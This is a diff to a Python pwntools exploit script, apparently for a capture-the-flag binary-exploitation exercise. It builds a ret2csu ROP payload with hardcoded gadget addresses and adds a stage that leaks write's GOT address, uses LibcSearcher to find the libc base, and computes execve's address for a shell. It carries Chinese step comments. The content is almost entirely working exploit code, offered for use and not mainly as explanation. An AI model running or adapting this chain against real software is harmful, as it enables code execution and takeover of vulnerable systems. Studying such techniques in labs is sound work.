@@ -1,4 +1,5 @@
 from pwn import *
+from LibcSearcher import LibcSearcher
 
 def craft_ret2csu_payload(csu_gadget_addr, func_gadget_addr, rbx, rbp, r12, r13, r14, r15, last):
     # This function assumes that the 'csu_gadget_addr' pops the values into the registers
@@ -43,6 +44,7 @@ if __name__ == '__main__':
     main = l5.symbols['main']
     print(hex(main))
 
+    # step1: 获取 write 的 GOT 地址
     payload1 = craft_ret2csu_payload(0x0040061a, # gadget csu
                                      0x004005ec, # gadget func
                                      0,          # rbx
@@ -65,3 +67,9 @@ if __name__ == '__main__':
 
     # 读取完 Helloworld 这一串输出，但是很奇怪这里读取到的是 'orld\n'
     print(sh.recv())
+
+    # step2: 获取 execve 在程序中的真实地址
+    libc = LibcSearcher('write' ,write_addr)
+    libc_base = write_addr - libc.dump('write')
+    execve_addr = libc_base + libc.dump('execve')
+    log.success('execve_addr ' + hex(execve_addr))
